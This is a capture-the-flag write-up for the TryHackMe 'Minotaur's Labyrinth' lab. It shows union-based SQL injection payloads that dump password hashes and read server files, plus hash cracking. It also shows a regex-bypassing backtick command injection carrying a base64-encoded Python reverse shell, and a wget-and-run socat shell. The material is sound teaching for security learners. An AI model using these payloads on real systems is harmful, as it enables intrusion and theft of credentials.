# Minotaur's Labyrinth

## Introduction:

Welcome to my another writeup! In this TryHackMe [Minotaur's Labyrinth](https://tryhackme.com/room/labyrinth8llv) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege Escalation: Easy

```
Hi, it's me, Daedalus, the creator of the Labyrinth. I was able to implement some backdoors, but Minotaur was able to (partially) fix them (that's a secret, so don't tell anyone). But let's get back to your task, root this machine and give Minotaur a lesson.
```

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# export RHOSTS=10.10.41.201 
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
Open 10.10.41.201:21
Open 10.10.41.201:80
Open 10.10.41.201:443
Open 10.10.41.201:3306
[...]
PORT    STATE SERVICE  REASON         VERSION
21/tcp   open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
|_http-favicon: Unknown favicon MD5: C4AF3528B196E5954B638C13DDC75F2F
| http-title: Login
|_Requested resource was login.html
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Issuer: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2004-10-01T09:10:30
| Not valid after:  2010-09-30T09:10:30
| MD5:   b181 18f6 1a4d cb51 df5e 189c 40dd 3280
| SHA-1: c4c9 a1dc 528d 41ac 1988 f65d b62f 9ca9 22fb e711
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAk+gAwIBAgIBADANBgkqhkiG9w0BAQQFADBcMQswCQYDVQQGEwJERTEP
| MA0GA1UECBMGQmVybGluMQ8wDQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNo
| ZSBGcmllbmRzMRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMDQxMDAxMDkxMDMwWhcN
| MTAwOTMwMDkxMDMwWjBcMQswCQYDVQQGEwJERTEPMA0GA1UECBMGQmVybGluMQ8w
| DQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNoZSBGcmllbmRzMRIwEAYDVQQD
| Ewlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMzLZFTC+qN6
| gTZfG9UQgXW3QgIxg7HVWnZyane+YmkWq+s5ZrUgOTPRtAF9I0AknmAcqDKD6p3x
| 8tnwGIWd4cDimf+JpPkVvV26PzkuJhRIgHXvtcCUbipi0kI0LEoVF1iwVZgRbpH9
| KA2AxSHCPvt4bzgxSnjygS2Fybgr8YbJAgMBAAGjgbcwgbQwHQYDVR0OBBYEFBP8
| X524EngQ0fE/DlKqi6VEk8dSMIGEBgNVHSMEfTB7gBQT/F+duBJ4ENHxPw5Sqoul
| RJPHUqFgpF4wXDELMAkGA1UEBhMCREUxDzANBgNVBAgTBkJlcmxpbjEPMA0GA1UE
| BxMGQmVybGluMRcwFQYDVQQKEw5BcGFjaGUgRnJpZW5kczESMBAGA1UEAxMJbG9j
| YWxob3N0ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEAFaDLTAkk
| p8J2SJ84I7Fp6UVfnpnbkdE2SBLFRKccSYZpoX85J2Z7qmfaQ35p/ZJySLuOQGv/
| IHlXFTt9VWT8meCpubcFl/mI701KBGhAX0DwD5OmkiLk3yGOREhy4Q8ZI+Eg75k7
| WF65KAis5duvvVevPR1CwBk7H9CDe8czwrc=
|_-----END CERTIFICATE-----
| http-title: Login
|_Requested resource was login.html
|_http-favicon: Unknown favicon MD5: BE43D692E85622C2A4B2B588A8F8E2A6
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-18-61-134.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
```

According to `rustscan` result, we have 4 ports are opened:

Ports Open        | Service
------------------|------------------------
21                | ProFTPD
80                | Apache 2.4.48
443               | Apache 2.4.48
3306              | MySQL

## FTP on Port 21

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# ftp $RHOSTS
Connected to 10.10.41.201.
220 ProFTPD Server (ProFTPD) [::ffff:10.10.41.201]
Name (10.10.41.201:nam): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
```

We can login as anonymous!

```
ftp> ls -lah
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021 pub

ftp> ls -lah
drwxr-xr-x   2 root     root         4.0k Jun 15  2021 .secret
-rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
```

```
ftp> cd .secret

ftp> ls -lah
-rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
-rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt
```

Let's download all the files via `wget`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# wget -r ftp://anonymous:''@$RHOSTS/
```

**message.txt:**
```
┌──(root🌸siunam)-[~/…/ctf/Minotaur's_Labyrinth/10.10.41.201/pub]
└─# cat message.txt 
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

**keep_in_mind.txt:**
```
┌──(root🌸siunam)-[~/…/Minotaur's_Labyrinth/10.10.41.201/pub/.secret]
└─# cat keep_in_mind.txt 
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

**Flag1:**
```
┌──(root🌸siunam)-[~/…/Minotaur's_Labyrinth/10.10.41.201/pub/.secret]
└─# cat flag.txt        
fl4g{Redacted}
```

## HTTP on Port 80

**Nikto:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# nikto -h $RHOSTS
[...]
+ Root page / redirects to: login.html
```

Found `login.html`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a1.png)

**View-Source:**
```html
                <nav class="level">
                    <div class="level-item has-text-centered">
                        <div>
                            <!-- response - oh would have thouhgt it would be this easy :) -->
                            <a id="forgot-password">Forgot Password?</a>
                        </div>
                    </div>
                    <div class="level-item has-text-centered">
                        <br>
                        <a href="jebait.html">Click here for root flag</a>
                    </div>
```

**Login form:**
```html
				<form>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="name" placeholder="u2ern4me" autocomplete="username" required id="email1" />
                        </div>
                    </div>
                    <div class="field">
                        <div class="control">
                            <input class="input is-medium is-rounded" type="password" placeholder="**********" autocomplete="current-password" required id="password1" />
                        </div>
                    </div>
                    <br />
                    <input id="submit" type="button" class="btn-submit" value="Submit" />
                </form>
```

Seems nothing here. Let's enumerate again.

I tried to GET the `robots.txt`, but it redirects me to `login.html`:

```html
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -vv http://$RHOSTS/robots.txt
< HTTP/1.1 302 Found
[...]
< Location: login.html
[...]
    <div class="jumbotron text-center text-white bg-secondary rounded-0">
        <img src="imgs\minotaur.png" alt="" class="rounded w-25" />
        <p>Welcome to the begin of my Labyrinth</p>
        <p>-- Minotaur</p>
    </div>



    <div class="container">
        <div class="row">
            <div class="col-sm-6">
                <div class="form-group" id="select fields">
                    <label>Choose table:</label>
                    <select name="theComboBox" id="theComboBox">
                        <option>People</option>
                        <option>Creatures</option>
                    </select>
                    <br>
                    <label for="selectlist">namePeople/nameCreature:</label>
                    <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
                    <input type="" name="" id="name-input-field" class="form-control">
                </div>
                <button class="btn btn-secondary" id="btn-choose-name">
                    Search  
                </button>
            </div>
        </div>
    </div>
[...]
```

```html
<!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
```

In the `login.html`, we can also see there is a `login.js` in the View-Source:

```html
<script src="js/login.js"></script>
```

**/js/login.js:**
```js
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
//                             |\____/|
///                           (\|----|/)
//                             \ 0  0 /
//                              |    |
//                           ___/\../\____
//                          /     --       \

$(document).ready(function() {
    $("#forgot-password").click(function() {
        alert("Ye .... Thought it would be this easy? \n                       -_______-")
    });
    $("#submit").click(function() {
        console.log("TEST")

        var email = $("#email1").val();
        var password = $("#password1").val();

        if (email == '' || password == '') {
            alert("Please fill all fields.");
            return false;
        }

        $.ajax({
            type: "POST",
            url: "login.php",
            data: {
                email: email,
                password: password

            },
            cache: false,
            success: function(data) {
                //alert(data);
                window.location.href = "index.php"
            },
            error: function(xhr, status, error) {
                console.error(xhr);
            }
        });

    });

});
```

Ohh! We might find the password for user `daedalus`!

```js
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
```

Instead of reverse engineering this in a web browser's console, we can automate this process via writing a simple python script:

```py
#!/usr/bin/env python3

def pwdgen():
	a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
	b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
	c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]

	print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])

pwdgen()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# python3 pwdgen.py 
{Redacted}
```

We now can login to the web server in `login.html` as user `daedalus`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a3.png)

In the View-Source in `index.php`, we can see 1 javascript is interesting:

```html
<script src="js/userlvl.js"></script>
```

**/js/userlvl.js:**
```js
$(document).ready(function() {

    $("#btn-choose-name").click(function() {
        var name_input = $("#name-input-field").val()
        var table_input = $('#theComboBox option:selected').text()
        table_input = table_input.toLowerCase()

        // alert(table_input);
        // alert(name_input);

        
        if(table_input == "people"){
            // console.log("PEOPLE")
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "namePeople": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idPeople + '</td>';
                            list += '<td>' + data[key][key1].namePeople + '</td>'
                            list += '<td>' + data[key][key1].passwordPeople + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No callback")
                }
            });
        } else if (table_input == "creatures") {
            // console.log("CREATURES")
            
            $.ajax({
                url: `api/${table_input}/search`,
                type: 'POST',
                dataType: "json",
                data: { "nameCreature": `${name_input}` },
                success: function(data) {
                    var list = ''
                    for (var key in data) {
                        for (var key1 in data[key]) {
                            list += '<tr>';
                            list += '<td>' + data[key][key1].idCreature + '</td>';
                            list += '<td>' + data[key][key1].nameCreature + '</td>'
                            list += '<td>' + data[key][key1].passwordCreature + '</td>'
                            list += '</tr>';
                        }
                    }
                    $('#table-search').append(list);
                },
                error: function() {
                    alert("No Callback")
                }
            });
        }
    });


});
```

Looks like the database has a field called `passwordPeople` and `passwordCreature`.

Also, we can see the API is being exposed, which means **we can send requests to the API**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople="

		[[]]
```

Hmm... What if there is a **SQL Injection** vulnerability?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' OR 1=1-- -"

		[[{"idPeople":"1","namePeople":"Eurycliedes","passwordPeople":"42354020b68c7ed28dcdeabd5a2baf8e"},{"idPeople":"2","namePeople":"Menekrates","passwordPeople":"0b3bebe266a81fbfaa79db1604c4e67f"},{"idPeople":"3","namePeople":"Philostratos","passwordPeople":"b83f966a6f5a9cff9c6e1c52b0aa635b"},{"idPeople":"4","namePeople":"Daedalus","passwordPeople":"b8e4c23686a3a12476ad7779e35f5eb6"},{"idPeople":"5","namePeople":"M!n0taur","passwordPeople":"1765db9457f496a39859209ee81fbda4"}]] 
```

Nice!

How about `creatures` table?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/creatures/search -d "nameCreature=' OR 1=1-- -"
		
		[[{"idCreature":"1","nameCreature":"Cerberos","passwordCreature":"3898e56bf6fa6ddfc3c0977c514a65a8"},{"idCreature":"2","nameCreature":"Pegasus","passwordCreature":"5d20441c392b68c61592b2159990abfe"},{"idCreature":"3","nameCreature":"Chiron","passwordCreature":"f847149233ae29ec0e1fcf052930c044"},{"idCreature":"4","nameCreature":"Centaurus","passwordCreature":"ea5540126c33fe653bf56e7a686b1770"}]]
```

**Table `people`:**
```json
[
    {
        "idPeople": "1",
        "namePeople": "Eurycliedes",
        "passwordPeople": "42354020b68c7ed28dcdeabd5a2baf8e"
    },
    {
        "idPeople": "2",
        "namePeople": "Menekrates",
        "passwordPeople": "0b3bebe266a81fbfaa79db1604c4e67f"
    },
    {
        "idPeople": "3",
        "namePeople": "Philostratos",
        "passwordPeople": "b83f966a6f5a9cff9c6e1c52b0aa635b"
    },
    {
        "idPeople": "4",
        "namePeople": "Daedalus",
        "passwordPeople": "b8e4c23686a3a12476ad7779e35f5eb6"
    },
    {
        "idPeople": "5",
        "namePeople": "M!n0taur",
        "passwordPeople": "1765db9457f496a39859209ee81fbda4"
    }
]
```

**Table `creatures`:**
```json
[
    [
        {
            "idCreature": "1",
            "nameCreature": "Cerberos",
            "passwordCreature": "3898e56bf6fa6ddfc3c0977c514a65a8"
        },
        {
            "idCreature": "2",
            "nameCreature": "Pegasus",
            "passwordCreature": "5d20441c392b68c61592b2159990abfe"
        },
        {
            "idCreature": "3",
            "nameCreature": "Chiron",
            "passwordCreature": "f847149233ae29ec0e1fcf052930c044"
        },
        {
            "idCreature": "4",
            "nameCreature": "Centaurus",
            "passwordCreature": "ea5540126c33fe653bf56e7a686b1770"
        }
    ]
]
```

Maybe we should crack `M!n0taur`'s password hash? Because he is an admin:

```html
<!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# nano m\!n0taur.hash
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 m\!n0taur.hash
[...]
{Redcated}       (M!n0taur)
```

Cracked!

Let's connect to MySQL:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# mysql -uM\!n0taur -p{Redacted} -h $RHOSTS
ERROR 1130 (HY000): Host 'ip-10-18-61-134.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
```

Nope...

Let's take a step back. Since we found a SQL Injection vulnerability, why not keep exploiting it?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT 1,2,3-- -"  

		[[{"idPeople":"1","namePeople":"2","passwordPeople":"3"}]]
```

Vulnerable to **Union-based SQL Injection**.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,version()-- -"

		
		
		[[{"idPeople":null,"namePeople":null,"passwordPeople":"10.4.19-MariaDB"}]]
```

- MySQL version: 10.4.19-MariaDB

**Retrieve database names:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,concat(schema_name) FROM information_schema.schemata-- -"
```

- information_schema
- performance_schema
- labyrinth
- phpmyadmin
- test
- mysql

How about **load a file** in MySQL?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,load_file('/etc/passwd')-- -"
		
		[[{"idPeople":null,"namePeople":null,"passwordPeople":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nuuidd:x:105:111::\/run\/uuidd:\/usr\/sbin\/nologin\navahi-autoipd:x:106:112:Avahi autoip daemon,,,:\/var\/lib\/avahi-autoipd:\/usr\/sbin\/nologin\nusbmux:x:107:46:usbmux daemon,,,:\/var\/lib\/usbmux:\/usr\/sbin\/nologin\ndnsmasq:x:108:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nrtkit:x:109:114:RealtimeKit,,,:\/proc:\/usr\/sbin\/nologin\ncups-pk-helper:x:110:116:user for cups-pk-helper service,,,:\/home\/cups-pk-helper:\/usr\/sbin\/nologin\nspeech-dispatcher:x:111:29:Speech Dispatcher,,,:\/var\/run\/speech-dispatcher:\/bin\/false\nwhoopsie:x:112:117::\/nonexistent:\/bin\/false\nkernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:\/:\/usr\/sbin\/nologin\nsaned:x:114:119::\/var\/lib\/saned:\/usr\/sbin\/nologin\navahi:x:115:120:Avahi mDNS daemon,,,:\/var\/run\/avahi-daemon:\/usr\/sbin\/nologin\ncolord:x:116:121:colord colour management daemon,,,:\/var\/lib\/colord:\/usr\/sbin\/nologin\nhplip:x:117:7:HPLIP system user,,,:\/var\/run\/hplip:\/bin\/false\ngeoclue:x:118:122::\/var\/lib\/geoclue:\/usr\/sbin\/nologin\npulse:x:119:123:PulseAudio daemon,,,:\/var\/run\/pulse:\/usr\/sbin\/nologin\ngnome-initial-setup:x:120:65534::\/run\/gnome-initial-setup\/:\/bin\/false\ngdm:x:121:125:Gnome Display Manager:\/var\/lib\/gdm3:\/bin\/false\nminotaur:x:1000:1000:minotaur,,,:\/home\/minotaur:\/bin\/bash\nmysql:x:123:128:MySQL Server,,,:\/nonexistent:\/bin\/false\nanonftp:x:1001:1001:,,,:\/home\/anonftp:\/bin\/bash\n"}]]
```

We can!! Then how about **writing to a file**?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,'test' INTO OUTFILE '/var/www/html/test.txt'-- -"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl http://$RHOSTS/test.txt  

		
		<!DOCTYPE html>
[...]
```

I don't think so... Hmm... Let's go back.

Since we found user `M!n0taur`'s password, and he has the admin permission. Why not try to login as that user?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a5.png)

Yes!! We found the second flag and a `Secret_Stuff` page.

**Flag2:**
```
fla6{Redacted}
```

# Initial Foothold

**echo.php:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Minotaur's-Labyrinth/images/a8.png)

Maybe it's vulnerable to **command injection**?? Let's give it a try:

**Input:**
```
&& ping -c 4 10.18.61.134
```

**Output:**
```
You really think this is gonna be possible i fixed this @Deadalus -_- !!!? 
```

Looks like there are some **filters** happening. Let's **combine with the SQL Injection** vulnerbility to see it's **source code**!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# curl -X POST http://$RHOSTS/api/people/search -d "namePeople=' UNION ALL SELECT NULL,NULL,load_file('/var/www/html/echo.php')-- -"

		[[{"idPeople":null,"namePeople":null,"passwordPeople":"<?php\ninclude('session.php');\n\n                if(isset($_SESSION['user'])){\n$user = $_SESSION['user'];\n$select = \"SELECT permissionPeople FROM people WHERE namePeople=:namePeople\";\n\n\ttry {\n\t\t$result = $conn->prepare($select);\n\n\n\t\t$result->bindParam(':namePeople', $user);\n\n\t\t\n\t\t$result->execute();\n\n        $all_rows = [];\n        while($row = $result->fetch(PDO::FETCH_ASSOC)) {\n        $all_rows[] = $row;\n        $pem =  json_encode($all_rows[0]); \n        if(strpos($pem, \"admin\") == false){\n            header(\"Location: index.php\");\n        }\n        }\n \n}\ncatch (PDOException $e) {\n    \/\/http_response_code(500);\n    echo json_encode(\n        array(\"message\" => \"Something went wrong:\" . $e->getMessage())\n    );\n}\n}\n?>\n\n<!DOCTYPE html>\n<html lang=\"de\">\n<title>Admin Pannel<\/title>\n<link href=\"\/\/maxcdn.bootstrapcdn.com\/bootstrap\/3.3.0\/css\/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\">\n<script src=\"\/\/maxcdn.bootstrapcdn.com\/bootstrap\/3.3.0\/js\/bootstrap.min.js\"><\/script>\n<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n<link rel=\"icon\" type=\"image\/png\" sizes=\"16x16\" href=\"favicon.png\">\n\n<div class=\"container\" style=\"margin-top: 8%;\">\n    <div class=\"col-md-6 col-md-offset-3\">\n        <div class=\"row\">\n            <div id=\"logo\" class=\"text-center\">\n                <img src=\"imgs\/login.jpg\" width=\"300px\" \/>\n                <h4>Welcome to my secret echo-pannel...<\/h4>\n            <\/div>\n            <form role=\"form\" id=\"form-buscar\">\n                <div class=\"form-group\">\n                    <div class=\"input-group\">\n                        <input id=\"1\" class=\"form-control\" type=\"text\" name=\"search\" placeholder=\"echo something...\" required\/>\n                        <span class=\"input-group-btn\">\n<button class=\"btn btn-secondary\" type=\"submit\">\n<i class=\"glyphicon glyphicon-search\" aria-hidden=\"true\"><\/i> echo\n<\/button>\n<\/span>\n                    <\/div>\n                <\/div>\n            <\/form>\n            \n        <\/div>\n    <\/div>\n<\/div>\n\n<\/html>\n<?php\n             \n\n             if (isset($_GET['search'])){\n                $search = $_REQUEST['search']; \n                $command = \"bash -c 'echo \" . $search . \"'\"; \n                if($search==\"\") { \n                    echo \"<div class='col-md-5 col-md-offset-4 centered'>Your not gonna reach anythink with this !! <\/div>\"; \n                }elseif (preg_match('\/[#!@%^&*()$_+=\\\u00b0\\[\\]\\';,{}|\":>?~\\\\\\\\]\/', $search)) {\n                    echo \"<div class='col-md-5 col-md-offset-4 centered'>You really think this is gonna be possible i fixed this @Deadalus -_- !!!? <\/div>\"; \n                }\n             else { \n                system($command);\n             }\n             \n            }\n            ?>"}]]   
```

**Truncated PHP code:**
```php
<?php
             if (isset($_GET['search'])){
                $search = $_REQUEST['search']; 
                $command = \"bash -c 'echo \" . $search . \"'\"; 
                if($search==\"\") { 
                    echo \"<div class='col-md-5 col-md-offset-4 centered'>Your not gonna reach anythink with this !! </div>\"; 
                }elseif (preg_match('/[#!@%^&*()$_+=\°\[\]\';,{}|\":>?~\\\\]/', $search)) {
                    echo \"<div class='col-md-5 col-md-offset-4 centered'>You really think this is gonna be possible i fixed this @Deadalus -_- !!!? </div>\"; 
                }
             else { 
                system($command);
             }
             
            }
?>
```

Hmm... Let's take a look at the **regular expression** part:

**Filter:**
```
/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/
```

Looks like some special characters are missing!

**Missing special characters:**
```
"./<+-`
```

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection) talking about command injection, **if "\`" is allowed, we can execute arbitrary command with it!**

**Input:**
```
`ls`
```

**Output:**
```
api css dbConnect.php echo.php favicon.png imgs index.php jebait.html js login.html login.php logout.php logs README.md session2.php session.php 
```

We have **command injection**!! Let's get a reverse shell!

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# nc -lnvp 13337
listening on [any] 13337 ...
```

- Next, we can use the **`base64` decode trick**: 

> Note: We `base64` the payload is because the filter. Please also note that the `base64` payload shouldn't contain the padding (`=`), as it's the part of the filter.

**Input:**
```
`echo "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTguNjEuMTM0IiwxMzMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikn" | base64 -d | bash`
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# nc -lnvp 13337
[...]
daemon@labyrinth:/opt/lampp/htdocs$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
daemon
labyrinth
uid=1(daemon) gid=1(daemon) groups=1(daemon)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:9d:55:2f:26:31 brd ff:ff:ff:ff:ff:ff
    inet 10.10.92.1/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::9d:55ff:fe2f:2631/64 scope link 
       valid_lft forever preferred_lft forever
```

And I'm `daemon`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

daemon@labyrinth:/opt/lampp/htdocs$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Minotaur's_Labyrinth]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
[...]
daemon@labyrinth:/opt/lampp/htdocs$ stty rows 22 columns 121
daemon@labyrinth:/opt/lampp/htdocs$ export TERM=xterm-256color
